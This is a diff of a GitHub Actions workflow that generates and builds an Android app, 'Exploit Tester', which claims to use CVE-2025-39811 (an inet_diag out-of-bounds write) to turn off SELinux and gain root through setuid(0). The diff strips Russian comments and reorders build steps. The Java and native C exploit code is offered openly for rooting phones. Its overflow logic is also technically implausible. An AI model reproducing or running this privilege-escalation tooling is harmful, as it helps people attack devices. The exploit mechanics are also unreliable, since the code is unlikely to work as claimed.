@@ -94,12 +94,12 @@ jobs:
                   scroll.addView(logPanel);
                   setContentView(scroll);
                   
-                  addLog("=== EXPLOIT TESTER FOR ANDROID 14 ===\n");
+                  addLog("=== EXPLOIT TESTER FOR ANDROID 14 ===");
                   addLog("Exploit: CVE-2025-39811 (inet_diag OOB write)");
-                  addLog("Target: selinux_enforcing → 0, then setuid(0)\n");
-                  addLog("[*] Starting exploit...\n");
+                  addLog("Target: selinux_enforcing -> 0, then setuid(0)");
+                  addLog("");
+                  addLog("[*] Starting exploit...");
                   
-                  // Запуск эксплойта в отдельном потоке
                   new Thread(this::runExploit).start();
               }
               
@@ -111,22 +111,19 @@ jobs:
                       tv.setTextColor(Color.BLACK);
                       tv.setPadding(0, 5, 0, 5);
                       logPanel.addView(tv);
-                      // Автопрокрутка вниз (через postDelayed)
-                      final ScrollView sv = (ScrollView) logPanel.getParent();
+                      ScrollView sv = (ScrollView) logPanel.getParent();
                       sv.postDelayed(() -> sv.fullScroll(ScrollView.FOCUS_DOWN), 100);
                   });
               }
               
               private void runExploit() {
-                  // ШАГ 1: Открыть netlink сокет
                   int sock = nativeOpenNetlink();
                   addLog("[1] netlink socket fd=" + sock);
                   if (sock < 0) {
-                      addLog("[FAIL] Cannot open netlink socket. Device not vulnerable?");
+                      addLog("[FAIL] Cannot open netlink socket.");
                       return;
                   }
                   
-                  // ШАГ 2: Отправить переполненный пакет
                   boolean overflowSent = nativeSendOverflow(sock);
                   addLog("[2] Overflow packet sent: " + (overflowSent ? "OK" : "FAIL"));
                   if (!overflowSent) {
@@ -134,16 +131,13 @@ jobs:
                       return;
                   }
                   
-                  // ШАГ 3: Проверить SELinux
                   boolean selinuxDisabled = nativeCheckSelinux();
                   addLog("[3] SELinux enforcing = " + (!selinuxDisabled ? "1 (ENABLED)" : "0 (DISABLED)"));
                   
-                  // ШАГ 4: Попытаться получить root
                   if (selinuxDisabled) {
                       addLog("[4] SELinux disabled, attempting setuid(0)...");
                       nativeBecomeRoot();
                       
-                      // ШАГ 5: Проверить root через id
                       try {
                           Process p = Runtime.getRuntime().exec("id");
                           BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
@@ -152,13 +146,13 @@ jobs:
                           addLog("[5] " + idOut);
                           
                           if (idOut != null && idOut.contains("uid=0")) {
-                              addLog("\n################################");
+                              addLog("");
+                              addLog("################################");
                               addLog("#  SUCCESS: ROOT ACHIEVED!   #");
-                              addLog("################################\n");
+                              addLog("################################");
+                              addLog("");
                               addLog("[+] You can now run commands as root");
-                              addLog("[+] Example: write to /data/local/tmp/");
                               
-                              // Демонстрация: пишем файл как root
                               try {
                                   DataOutputStream dos = new DataOutputStream(
                                       Runtime.getRuntime().exec("sh").getOutputStream()
@@ -167,12 +161,11 @@ jobs:
                                   dos.writeBytes("chmod 666 /data/local/tmp/exploit_root.txt\n");
                                   dos.writeBytes("exit\n");
                                   dos.flush();
-                                  addLog("[+] Created /data/local/tmp/exploit_root.txt (proof)");
+                                  addLog("[+] Created /data/local/tmp/exploit_root.txt");
                               } catch (Exception e) {
                                   addLog("[!] Could not write proof file: " + e.getMessage());
                               }
                               
-                              // Дополнительно: показать текущий uid/gid
                               Process p2 = Runtime.getRuntime().exec("sh -c 'echo UID=$UID; id'");
                               BufferedReader br2 = new BufferedReader(new InputStreamReader(p2.getInputStream()));
                               String line;
@@ -180,21 +173,21 @@ jobs:
                                   addLog("[+] " + line);
                               }
                               br2.close();
-                              
                           } else {
-                              addLog("\n[FAIL] Root not achieved. SELinux disabled but setuid(0) failed.");
+                              addLog("");
+                              addLog("[FAIL] Root not achieved.");
                           }
                       } catch (Exception e) {
                           addLog("[FAIL] Error checking root: " + e.toString());
                       }
                   } else {
-                      addLog("\n[FAIL] SELinux still enforcing. Exploit did not work.");
-                      addLog("[*] This device may have SPL >= 2026-03 or patch applied.");
+                      addLog("");
+                      addLog("[FAIL] SELinux still enforcing. Exploit did not work.");
+                      addLog("[*] Device may have SPL >= 2026-03 or patch applied.");
                       addLog("[*] Phone is NOT damaged. You can retry (close and reopen app).");
                   }
               }
               
-              // Нативные методы (C)
               private native int nativeOpenNetlink();
               private native boolean nativeSendOverflow(int sock);
               private native boolean nativeCheckSelinux();
@@ -206,7 +199,7 @@ jobs:
           }
           EOF
 
-      - name: Generate native C code (exploit.c)
+      - name: Generate native C code
         run: |
           cat > app/src/main/jni/exploit.c << 'EOF'
           #include <jni.h>
@@ -220,8 +213,7 @@ jobs:
           #include <linux/sock_diag.h>
           
           JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetlink(JNIEnv *env, jobject thiz) {
-              int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG);
-              return sock;
+              return socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG);
           }
           
           JNIEXPORT jboolean JNICALL Java_com_exploit_tester_MainActivity_nativeSendOverflow(JNIEnv *env, jobject thiz, jint sock) {
@@ -232,13 +224,11 @@ jobs:
               } msg;
               
               memset(&msg, 0, sizeof(msg));
-              msg.nlh.nlmsg_len = 0xFFFF;  // переполнение длины
+              msg.nlh.nlmsg_len = 0xFFFF;
               msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
               msg.nlh.nlmsg_flags = NLM_F_REQUEST;
               msg.req.sdiag_family = AF_INET;
               msg.req.idiag_states = 0xFFFFFFFF;
-              
-              // Переполнение нулями (цель: обнулить selinux_enforcing)
               memset(msg.overflow, 0, sizeof(msg.overflow));
               
               int ret = send(sock, &msg, sizeof(msg), 0);
@@ -278,7 +268,7 @@ jobs:
           APP_PLATFORM := android-34
           EOF
 
-      - name: Generate build.gradle
+      - name: Generate build.gradle (app)
         run: |
           cat > app/build.gradle << 'EOF'
           apply plugin: 'com.android.application'
@@ -323,14 +313,7 @@ jobs:
           }
           EOF
 
-      - name: Generate settings.gradle
-        run: |
-          cat > settings.gradle << 'EOF'
-          rootProject.name = "ExploitTester"
-          include ':app'
-          EOF
-
-      - name: Generate top-level build.gradle
+      - name: Generate build.gradle (top level)
         run: |
           cat > build.gradle << 'EOF'
           buildscript {
@@ -355,7 +338,14 @@ jobs:
           }
           EOF
 
-      - name: Set up gradle wrapper
+      - name: Generate settings.gradle
+        run: |
+          cat > settings.gradle << 'EOF'
+          rootProject.name = "ExploitTester"
+          include ':app'
+          EOF
+
+      - name: Create gradle wrapper files
         run: |
           mkdir -p gradle/wrapper
           cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
@@ -365,12 +355,30 @@ jobs:
           zipStoreBase=GRADLE_USER_HOME
           zipStorePath=wrapper/dists
           EOF
+          
+          cat > gradlew << 'EOF'
+          #!/bin/sh
+          set -e
+          DEFAULT_JVM_OPTS=""
+          APP_BASE_NAME=`basename "$0"`
+          APP_HOME=`dirname "$0"`
+          CLASSPATH=\$APP_HOME/gradle/wrapper/gradle-wrapper.jar
+          exec java \$DEFAULT_JVM_OPTS \$JAVA_OPTS -classpath "\$CLASSPATH" org.gradle.wrapper.GradleWrapperMain "\$@"
+          EOF
+          chmod +x gradlew
+          
+          cat > gradlew.bat << 'EOF'
+          @if "%DEBUG%" == "" @echo off
+          set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar
+          java %DEFAULT_JVM_OPTS% %JAVA_OPTS% -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %*
+          EOF
 
-      - name: Grant execute permission to gradlew
-        run: chmod +x gradlew
+      - name: Download gradle-wrapper.jar
+        run: |
+          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar
 
       - name: Build APK
-        run: ./gradlew assembleDebug
+        run: ./gradlew assembleDebug --no-daemon
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
